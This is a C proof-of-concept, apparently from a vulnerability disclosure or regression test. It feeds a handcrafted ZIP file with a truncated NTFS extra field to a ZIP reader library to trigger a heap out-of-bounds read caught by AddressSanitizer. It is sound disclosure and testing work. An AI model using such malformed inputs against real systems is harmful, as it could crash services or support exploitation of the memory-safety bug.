/*
 * PoC: heap out-of-bounds read in the ZIP reader's NTFS (0x000A)
 * extra-field handling.
 *
 * The archive below is a plain streaming ZIP: a single local file
 * header for "test.txt" followed by one extra field, an 0x000A NTFS
 * field that carries a tag-1 attribute block.  The block announces
 * Size = 24 (three 8-byte FILETIMEs) but the field -- and with it the
 * whole file -- ends after only 20 of those 24 data bytes, so decoding
 * the third FILETIME reads past the end of the buffer.  The extra
 * field is the last thing in the file, and the file is copied into an
 * exact-size heap buffer, so that overread runs off the end of the
 * allocation and AddressSanitizer aborts the process.
 *
 * Everything goes through the public API: the streamable ZIP reader,
 * a memory client, and archive_read_next_header().
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "archive.h"
#include "archive_entry.h"

static const unsigned char zip_bytes[] = {
/* --- local file header --- */
	0x50, 0x4b, 0x03, 0x04, /* local file header signature */
	0x14, 0x00,             /* version needed to extract: 2.0 */
	0x00, 0x00,             /* general purpose bit flag */
	0x00, 0x00,             /* compression method: stored */
	0x00, 0x00,             /* last mod file time */
	0x21, 0x00,             /* last mod file date */
	0x00, 0x00, 0x00, 0x00, /* CRC-32 */
	0x03, 0x00, 0x00, 0x00, /* compressed size = 3 */
	0x03, 0x00, 0x00, 0x00, /* uncompressed size = 3 */
	0x08, 0x00,             /* file name length = 8 */
	0x20, 0x00,             /* extra field length = 32 */
	't', 'e', 's', 't', '.', 't', 'x', 't',
/* --- extra field 0x000a "NTFS" (last thing in the file) --- */
	0x0a, 0x00,             /* extra field ID = 0x000a */
	0x1c, 0x00,             /* extra field size = 28 */
	0x00, 0x00, 0x00, 0x00, /* reserved */
	0x01, 0x00,             /* NTFS attribute tag 1 */
	0x18, 0x00,             /* NTFS attribute size = 24 ... */
	0x40, 0x42, 0x7c, 0xc6, 0x47, 0x17, 0xda, 0x01, /* Mtime FILETIME */
	0x80, 0x4e, 0x26, 0x02, 0x48, 0x17, 0xda, 0x01, /* Atime FILETIME */
	0xc0, 0x5a, 0xd0, 0x3d, /* Ctime FILETIME: first 4 of 8 bytes only */
/* ... the remaining 4 bytes of the announced 24 are not in the file */
};

int
main(void)
{
	struct archive *a;
	struct archive_entry *ae;
	unsigned char *buf;
	int r;

	/* Exact-size heap copy so an overread leaves the allocation. */
	buf = malloc(sizeof(zip_bytes));
	if (buf == NULL)
		return (1);
	memcpy(buf, zip_bytes, sizeof(zip_bytes));

	a = archive_read_new();
	archive_read_support_format_zip_streamable(a);
	archive_read_open_memory(a, buf, sizeof(zip_bytes));

	r = archive_read_next_header(a, &ae);
	printf("archive_read_next_header returned %d: %s\n", r,
	    r == ARCHIVE_OK ? archive_entry_pathname(ae)
	    : archive_error_string(a));

	archive_read_free(a);
	free(buf);
	return (0);
}
